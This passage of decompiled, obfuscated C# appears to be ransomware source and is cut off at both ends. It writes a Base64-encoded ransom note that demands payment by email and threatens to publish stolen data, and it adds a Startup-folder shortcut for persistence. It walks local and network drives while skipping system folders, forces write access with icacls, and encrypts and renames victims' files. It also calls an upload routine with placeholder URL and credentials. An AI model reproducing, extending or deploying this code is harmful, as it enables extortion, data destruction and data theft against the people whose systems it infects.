					File.AppendAllText(SlCyjezmzcjRF, "File: " + uhjsnWZEki + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string jxLIBcytJQJnAi()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string tmlfgLSyxZfPglA(string ZKIICqEpbRDMELC)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(agZtqMkMayfivgE("SGVsbG8uDQoNCllvdXIgZmlsZXMsIGRvY3VtZW50cywgZGF0YWJhc2VzIGFuZCBhbGwgdGhlIHJlc3QgYXJlbid0IFJFTU9WRUQuIA0KVGhleSBhcmUgY2lwaGVyZWQgYnkgdGhlIG1vc3QgcmVsaWFibGUgZW5jaXBoZXJpbmcuDQpJdCBpcyBpbXBvc3NpYmxlIHRvIHJlc3RvcmUgZmlsZXMgd2l0aG91dCBvdXIgaGVscC4NCllvdSB3aWxsIHRyeSB0byByZXN0b3JlIGZpbGVzIGluZGVwZW5kZW50IHlvdSB3aWxsIGxvc2UgZmlsZXMNCkZPUkVWRVIuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCllvdSB3aWxsIGJlIGFibGUgdG8gcmVzdG9yZSBmaWxlcyBzbzoNCg0KMS4gdG8gY29udGFjdCB1cyBieSBlLW1haWw6IHJlY292ZXJ5ZmlsZXNAdGVjaG1haWwuaW5mbw0KDQoqIHJlcG9ydCB5b3VyIElEIGFuZCB3ZSB3aWxsIHN3aXRjaCBvZmYgYW55IHJlbW92YWwgb2YgZmlsZXMgDQogIChpZiBkb24ndCByZXBvcnQgeW91ciBJRCBpZGVudGlmaWVyLCB0aGVuIGVhY2ggMjQgaG91cnMgd2lsbCBiZQ0KICB0byBiZSByZW1vdmVkIG9uIDI0IGZpbGVzLiBJZiByZXBvcnQgdG8gSUQtd2Ugd2lsbCBzd2l0Y2ggb2ZmIGl0KQ0KDQoqIHlvdSBzZW5kIHlvdXIgSUQgaWRlbnRpZmllciBhbmQgMiBmaWxlcywgdXAgdG8gMiBNQiBpbiBzaXplIGV2ZXJ5b25lLg0KICBXZSBkZWNpcGhlciB0aGVtLCBhcyBwcm9vZiBvZiBhIHBvc3NpYmlsaXR5IG9mIGludGVycHJldGF0aW9uLg0KICBhbHNvIHlvdSByZWNlaXZlIHRoZSBpbnN0cnVjdGlvbiB3aGVyZSBhbmQgaG93IG1hbnkgaXQgaXMgbmVjZXNzYXJ5IHRvIHBheS4NCg0KMi4geW91IHBheSBhbmQgY29uZmlybSBwYXltZW50Lg0KDQozLiBhZnRlciBwYXltZW50IHlvdSByZWNlaXZlIHRoZSBERUNPREVSIHByb2dyYW0uIHdoaWNoIHlvdSByZXN0b3JlIEFMTCBZT1VSIEZJTEVTLg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpXZSBkb3dubG9hZGVkIHlvdXIgZGF0YWJhc2VzLCBkYXRhIG9mIHlvdXIgZW1wbG95ZWVzLCB5b3VyIGN1c3RvbWVycywgZXRjLg0KSWYgeW91IGFuZCBJIGRvIG5vdCBhZ3JlZSwgeW91ciBkYXRhIHdpbGwgYmUgbWFkZSBwdWJsaWMhDQpXZSdsbCBnaXZlIGFjY2VzcyB0byBvdGhlciBoYWNrZXJzLg0KV2Ugd2lsbCBwdWJsaWNpemUgdGhlIG1lZGlhLiBTbyBhdHRlbnRpb24gaXMgcHJvdmlkZWQgdG8geW91Lg0KQnV0IEkgdGhpbmsgd2UnbGwgbWFrZSBhIGRlYWwu"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(agZtqMkMayfivgE("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(ZKIICqEpbRDMELC);
				if (ZKQhNlGAfwnU)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(agZtqMkMayfivgE("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(hmdnzLvPRv.fVoScpXlDYrrq());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(ZKIICqEpbRDMELC) && !QHRYFfpHvmAnP)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + ZKIICqEpbRDMELC);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(SlCyjezmzcjRF, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void aixOpqUMNlp(string TahtKyHPaXEhhkU, string EmlTfJQvAguDL)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + TahtKyHPaXEhhkU + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + EmlTfJQvAguDL);
		streamWriter.WriteLine("IconIndex=0");
		string text = EmlTfJQvAguDL.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void qLhCDLYchRKzR(string[] ckAlUZZNZMEPB, string[] qzIXjQhwadpoGAS, string[] LnvpEtgPxXqYi, string bfGQFVEaAau, string hJXHpzoBCAZVvwfuk)
	{
		if (NhUiHaxsDy && !jxLIBcytJQJnAi().Contains("XP"))
		{
			qwMjYClYeLe.vOqsxvPIaInpbw();
		}
		cGCyjVdvSXL = Convert.FromBase64String(bfGQFVEaAau);
		DriveInfo[] array = null;
		if (ckAlUZZNZMEPB[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = uBkYPWUaIYhOPOSL(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !ykYiTFCYjtGh.Contains(text))
							{
								ykYiTFCYjtGh.Add(text);
							}
							else if (!ykYiTFCYjtGh.Contains(array[i].Name))
							{
								ykYiTFCYjtGh.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!ykYiTFCYjtGh.Contains(array[i].Name))
							{
								ykYiTFCYjtGh.Add(array[i].Name);
							}
						}
					}
					else if (!ykYiTFCYjtGh.Contains(array[i].Name))
					{
						ykYiTFCYjtGh.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < ckAlUZZNZMEPB.Length; j++)
			{
				if (!ykYiTFCYjtGh.Contains(ckAlUZZNZMEPB[j]))
				{
					ykYiTFCYjtGh.Add(ckAlUZZNZMEPB[j]);
				}
			}
		}
		if (ykYiTFCYjtGh.Contains(agZtqMkMayfivgE("Qzpc")) && ChboADDhpopgpg == "YES")
		{
			ykYiTFCYjtGh.Remove(agZtqMkMayfivgE("Qzpc"));
		}
		if (MbhhcifckfQWC == "YES")
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				MtyYRHvZDgrSPEq.ugNfdQQaOiaMcyiZ();
			});
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(ykYiTFCYjtGh, delegate(string t)
		{
			if (FQIijKxWNIGko && !jxLIBcytJQJnAi().Contains("XP") && !jxLIBcytJQJnAi().Contains("Windows 7"))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						fCSCcBCUuOhJFjJ(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (YCgDOWQTASnYBU == "YES")
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					AIWAphzHta(t, qzIXjQhwadpoGAS, hJXHpzoBCAZVvwfuk, LnvpEtgPxXqYi, bfGQFVEaAau);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				AIWAphzHta(t, qzIXjQhwadpoGAS, hJXHpzoBCAZVvwfuk, LnvpEtgPxXqYi, bfGQFVEaAau);
			}
		});
	}

	public static void AIWAphzHta(string cOyLhzkkpBDo, string[] ObeiuQWrQRw, string nCdthhSRdLNhFh, string[] YFPOifUbMbIP, string QSnRHjJvyjpUcWg)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (zOOYSHYSeWvOobzd == "NO")
		{
			if (iZnRexINEwkRV == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && mjMhdDqwYRJ(cOyLhzkkpBDo))
			{
				JjJMGfjUKIz jjJMGfjUKIz = null;
				try
				{
					jjJMGfjUKIz = new JjJMGfjUKIz(cOyLhzkkpBDo.Replace("\\", ""));
				}
				catch
				{
					list = IqHvwZeNnat(cOyLhzkkpBDo, ObeiuQWrQRw, nCdthhSRdLNhFh, YFPOifUbMbIP, QSnRHjJvyjpUcWg);
					return;
				}
				try
				{
					WHkZEoQAhesRi(jjJMGfjUKIz.ToArray().ToList(), ObeiuQWrQRw, nCdthhSRdLNhFh, YFPOifUbMbIP, QSnRHjJvyjpUcWg);
					return;
				}
				catch (Exception)
				{
					list = IqHvwZeNnat(cOyLhzkkpBDo, ObeiuQWrQRw, nCdthhSRdLNhFh, YFPOifUbMbIP, QSnRHjJvyjpUcWg);
					return;
				}
			}
			list = IqHvwZeNnat(cOyLhzkkpBDo, ObeiuQWrQRw, nCdthhSRdLNhFh, YFPOifUbMbIP, QSnRHjJvyjpUcWg);
			return;
		}
		list = jxksNelHvCKE.SearchFiles(cOyLhzkkpBDo);
		foreach (string text in ObeiuQWrQRw)
		{
			foreach (string item in list)
			{
				if (YFPOifUbMbIP.Length != 0)
				{
					int num = 0;
					while (num < YFPOifUbMbIP.Length)
					{
						string value = YFPOifUbMbIP[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0385;
					}
				}
				if ((bNWpiFiTBoWLej == "NO" && !item.EndsWith(text)) || HUJfkxnbjYLg.Contains(item))
				{
					continue;
				}
				if (NfVMPYnMMJ == "YES")
				{
					try
					{
						if (jARNwzUwUMTWq.KioEuDUzlDg(item))
						{
							jARNwzUwUMTWq.TLMMbRBqrsEJER(item);
						}
					}
					catch
					{
					}
				}
				HUJfkxnbjYLg.Add(item);
				if (!mmgceOUJLT.Contains(Path.GetDirectoryName(item)))
				{
					mmgceOUJLT.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ldEZLuOxqcFm == "YES" && fileStream.Length > Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024 && !list3.Contains(text))
					{
						if (wrHvZpAvrSgJW == "YES")
						{
							foreach (string item2 in sSiWAwlCjtk)
							{
								if (item.ToLower().EndsWith(item2) && LmSFIAUjDvp == "YES")
								{
									if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LmSFIAUjDvp == "NO")
								{
									try
									{
										hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] swKyujrfiYVm = rXGCpkRzmuovpDl.ixVmRqpXGZeT(item, Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024);
						byte[] hNucWYcpei = rXGCpkRzmuovpDl.iCldzZsGXm(swKyujrfiYVm, Convert.FromBase64String(QSnRHjJvyjpUcWg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						rXGCpkRzmuovpDl.lXlBZHvZpzmZ(item, hNucWYcpei);
						if (nCdthhSRdLNhFh != ".*")
						{
							File.Move(item, item + nCdthhSRdLNhFh);
						}
					}
					else if (nCdthhSRdLNhFh != ".*")
					{
						keoXVIredpqFC(item, item + nCdthhSRdLNhFh, cGCyjVdvSXL);
					}
					else
					{
						keoXVIredpqFC(item, item + ".part", cGCyjVdvSXL);
					}
				}
				catch (Exception)
				{
				}
				IL_0385:;
			}
		}
	}

	public static void WHkZEoQAhesRi(List<string> LKTvVLBvXWAY, string[] seeerNMgziC, string GOYptZKYZHsrv, string[] jbCvYQxZysAZ, string ueQsZaJdyQzNRH)
	{
		List<string> NANSUGkiblrGd = new List<string> { "" };
		if (bNWpiFiTBoWLej == "NO")
		{
			string tlHeygDZtEO;
			Parallel.ForEach(seeerNMgziC, delegate(string t1)
			{
				foreach (string item in LKTvVLBvXWAY)
				{
					if (!item.Contains("C:\\Program Files\\") && !item.Contains("C:\\Program Files (x86)\\") && !item.Contains(":\\Windows\\") && !item.ToLower().Contains("perflogs") && !item.ToLower().Contains("internet explorer") && !item.Contains(":\\ProgramData\\") && !item.Contains("\\AppData\\") && !item.ToLower().Contains("msocache") && !item.ToLower().Contains("system volume information") && !item.ToLower().Contains("boot") && !item.ToLower().Contains("tor browser") && !item.ToLower().Contains("mozilla") && !item.ToLower().Contains("google chrome") && !item.ToLower().Contains("application data") && !item.Contains("autoexec.bat") && !item.Contains("desktop.ini") && !item.Contains("autorun.inf") && !item.Contains("ntuser.dat") && !item.Contains("NTUSER.DAT") && !item.Contains("iconcache.db") && !item.Contains("bootsect.bak") && !item.Contains("boot.ini") && !item.Contains("ntuser.dat.log") && !item.Contains("thumbs.db") && !item.ToLower().Contains("bootmgr") && !item.ToLower().Contains("pagefile.sys") && !item.ToLower().Contains("config.sys") && !item.ToLower().Contains("ntuser.ini") && !item.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !item.Contains("RSAKeys") && !item.Contains("Config.enc") && !item.Contains("RESTORE_FILES_INFO") && !item.EndsWith(GOYptZKYZHsrv) && !item.EndsWith("exe") && !item.EndsWith("dll") && !item.EndsWith("EXE") && !item.EndsWith("DLL") && !item.Contains("Recycle.Bin") && !item.Contains(ZJFGqhHHen) && !item.Contains(SlCyjezmzcjRF) && !item.Contains(uLoFxWVggAfF))
					{
						if (jbCvYQxZysAZ.Length != 0)
						{
							string[] array4 = jbCvYQxZysAZ;
							int num2 = 0;
							while (num2 < array4.Length)
							{
								string value2 = array4[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0b81;
							}
						}
						try
						{
							if (item.EndsWith(GOYptZKYZHsrv))
							{
								goto IL_0b81;
							}
						}
						catch (Exception)
						{
							goto IL_0b81;
						}
						if (item.EndsWith(t1) && !HUJfkxnbjYLg.Contains(item))
						{
							if (NfVMPYnMMJ == "YES")
							{
								try
								{
									if (jARNwzUwUMTWq.KioEuDUzlDg(item))
									{
										jARNwzUwUMTWq.TLMMbRBqrsEJER(item);
									}
								}
								catch
								{
								}
							}
							HUJfkxnbjYLg.Add(item);
							if (!mmgceOUJLT.Contains(Path.GetDirectoryName(item)))
							{
								mmgceOUJLT.Add(Path.GetDirectoryName(item));
							}
							BDUUIKslMbszMvU(item);
							try
							{
								new iPIBmSPcKTz().fgMMWLFsoedzr(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (hzzRDIjGDyq)
										{
											Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
											Console.WriteLine("----------------------------------------------------------------------------");
										}
									}
									catch
									{
									}
									bhxKBVXCniiAP(agZtqMkMayfivgE("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + agZtqMkMayfivgE("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + agZtqMkMayfivgE("OkYgL1QgL0MgL1E="));
								}
							}
							catch (Exception ex18)
							{
								if (bZJnUpHOpIgqq)
								{
									try
									{
										File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while checking for user write access permission: " + ex18.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_050e;
									}
									goto end_IL_050e_2;
									end_IL_050e:;
								}
								catch (Exception ex20)
								{
									if (bZJnUpHOpIgqq)
									{
										try
										{
											File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while reading if filesize is zero: " + ex20.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									SysSpLHfXXw++;
									goto end_IL_050e_2;
								}
								if (!(ldEZLuOxqcFm == "YES") || new FileInfo(item).Length <= Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024 || NANSUGkiblrGd.Contains(t1))
								{
									if (ZKQhNlGAfwnU)
									{
										GOYptZKYZHsrv = qoCjIwmYfANN + GOYptZKYZHsrv;
									}
									string text5 = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
									string text6 = "";
									text6 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
									string s3 = DDUEkMsefa.PFPBRyzXpmMZne(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (GOYptZKYZHsrv != ".*")
									{
										if (!SgwcaMaFwGfR)
										{
											if (!QHRYFfpHvmAnP)
											{
												ohAjzLYTnRJd(item, item + GOYptZKYZHsrv, cGCyjVdvSXL);
											}
											else
											{
												ohAjzLYTnRJd(item, item + GOYptZKYZHsrv, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!QHRYFfpHvmAnP)
												{
													TloNjDlLdEBIQ(item, item + GOYptZKYZHsrv, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
												}
												else
												{
													TloNjDlLdEBIQ(item, item + GOYptZKYZHsrv, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (bZJnUpHOpIgqq)
												{
													try
													{
														File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while fully writing to file: " + ex22.Message + "\r\n");
													}
													catch (Exception)
													{
													}
												}
												SysSpLHfXXw++;
												try
												{
													File.Move(item + GOYptZKYZHsrv, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_050e_2;
											}
										}
									}
									else if (!SgwcaMaFwGfR)
									{
										if (!QHRYFfpHvmAnP)
										{
											ohAjzLYTnRJd(item, item + ".part", cGCyjVdvSXL);
										}
										else
										{
											ohAjzLYTnRJd(item, item + ".part", Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!QHRYFfpHvmAnP)
											{
												TloNjDlLdEBIQ(item, item, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
											}
											else
											{
												TloNjDlLdEBIQ(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (bZJnUpHOpIgqq)
											{
												try
												{
													File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while fully writing to file: " + ex25.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											SysSpLHfXXw++;
											goto end_IL_050e_2;
										}
									}
									if (QHRYFfpHvmAnP)
									{
										if (GOYptZKYZHsrv != ".*")
										{
											cjxIyyVHKHrvDrL(item + GOYptZKYZHsrv, bytes3);
										}
										else
										{
											cjxIyyVHKHrvDrL(item, bytes3);
										}
									}
									goto IL_0b81;
								}
								try
								{
									if (GOYptZKYZHsrv != ".*")
									{
										if (ZKQhNlGAfwnU)
										{
											GOYptZKYZHsrv = qoCjIwmYfANN + GOYptZKYZHsrv;
										}
										File.Move(item, item + GOYptZKYZHsrv);
									}
								}
								catch (Exception ex27)
								{
									if (bZJnUpHOpIgqq)
									{
										try
										{
											File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while renaming to crypted extension: " + ex27.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									SysSpLHfXXw++;
									goto end_IL_050e_2;
								}
								tlHeygDZtEO = "";
								if (GOYptZKYZHsrv != ".*")
								{
									tlHeygDZtEO = item + GOYptZKYZHsrv;
								}
								else
								{
									tlHeygDZtEO = item;
								}
								if (wrHvZpAvrSgJW == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in sSiWAwlCjtk)
										{
											if (tlHeygDZtEO.ToLower().EndsWith(item2 + GOYptZKYZHsrv) && LmSFIAUjDvp == "YES")
											{
												if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(tlHeygDZtEO).Length)
												{
													try
													{
														hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
													}
													catch
													{
													}
												}
											}
											else if (tlHeygDZtEO.ToLower().EndsWith(item2) && LmSFIAUjDvp == "NO")
											{
												try
												{
													hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
								string text8 = "";
								text8 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
								string s4 = DDUEkMsefa.PFPBRyzXpmMZne(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (DeTwNBVFGbT == "NO")
								{
									byte[] array5 = null;
									byte[] array6 = rXGCpkRzmuovpDl.ixVmRqpXGZeT(tlHeygDZtEO, Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024);
									if (rXGCpkRzmuovpDl.lXlBZHvZpzmZ(hNucWYcpei: (!WSwhVqfGVa) ? (QHRYFfpHvmAnP ? rXGCpkRzmuovpDl.iCldzZsGXm(array6, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rXGCpkRzmuovpDl.iCldzZsGXm(array6, Convert.FromBase64String(ueQsZaJdyQzNRH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (QHRYFfpHvmAnP ? mZsSeBuSvlPmJ.voShjptzjbTK(array6, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : mZsSeBuSvlPmJ.voShjptzjbTK(array6, Convert.FromBase64String(ueQsZaJdyQzNRH), Convert.FromBase64String(yWaizfdbSvLTf))), gxtHysuevYkPA: tlHeygDZtEO, kefvkXQNqnLAH: bytes4))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + GOYptZKYZHsrv, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!QHRYFfpHvmAnP)
								{
									if (CZBAZmhlcpldk.jkBoTormCTqbO(tlHeygDZtEO, OonNbDeTktyi, ueQsZaJdyQzNRH, null, Convert.FromBase64String(yWaizfdbSvLTf)))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + GOYptZKYZHsrv, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (CZBAZmhlcpldk.jkBoTormCTqbO(tlHeygDZtEO, OonNbDeTktyi, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + GOYptZKYZHsrv, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_050e_2:;
							}
							catch (Exception)
							{
								goto IL_0b81;
							}
						}
					}
					continue;
					IL_0b81:
					LKTvVLBvXWAY.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(LKTvVLBvXWAY, delegate(string fileInfo)
		{
			if (!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data") && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("RESTORE_FILES_INFO") && !fileInfo.EndsWith(GOYptZKYZHsrv) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(ZJFGqhHHen) && !fileInfo.Contains(SlCyjezmzcjRF) && !fileInfo.Contains(uLoFxWVggAfF))
			{
				if (jbCvYQxZysAZ.Length != 0)
				{
					string[] array = jbCvYQxZysAZ;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d5b;
					}
				}
				try
				{
					if (fileInfo.EndsWith(GOYptZKYZHsrv))
					{
						goto IL_0d5b;
					}
				}
				catch (Exception)
				{
					goto IL_0d5b;
				}
				if (!HUJfkxnbjYLg.Contains(fileInfo))
				{
					if (NfVMPYnMMJ == "YES")
					{
						try
						{
							if (jARNwzUwUMTWq.KioEuDUzlDg(fileInfo))
							{
								jARNwzUwUMTWq.TLMMbRBqrsEJER(fileInfo);
							}
						}
						catch
						{
						}
					}
					HUJfkxnbjYLg.Add(fileInfo);
					if (!mmgceOUJLT.Contains(Path.GetDirectoryName(fileInfo)))
					{
						mmgceOUJLT.Add(Path.GetDirectoryName(fileInfo));
					}
					BDUUIKslMbszMvU(fileInfo);
					try
					{
						new iPIBmSPcKTz().fgMMWLFsoedzr(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (hzzRDIjGDyq)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							bhxKBVXCniiAP(agZtqMkMayfivgE("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + agZtqMkMayfivgE("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + agZtqMkMayfivgE("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (bZJnUpHOpIgqq)
						{
							try
							{
								File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_0651;
							}
							goto end_IL_0651_2;
							end_IL_0651:;
						}
						catch (Exception ex4)
						{
							if (bZJnUpHOpIgqq)
							{
								try
								{
									File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							SysSpLHfXXw++;
							goto end_IL_0651_2;
						}
						if (ldEZLuOxqcFm == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024)
						{
							try
							{
								if (GOYptZKYZHsrv != ".*")
								{
									if (ZKQhNlGAfwnU)
									{
										GOYptZKYZHsrv = qoCjIwmYfANN + GOYptZKYZHsrv;
									}
									File.Move(fileInfo, fileInfo + GOYptZKYZHsrv);
								}
							}
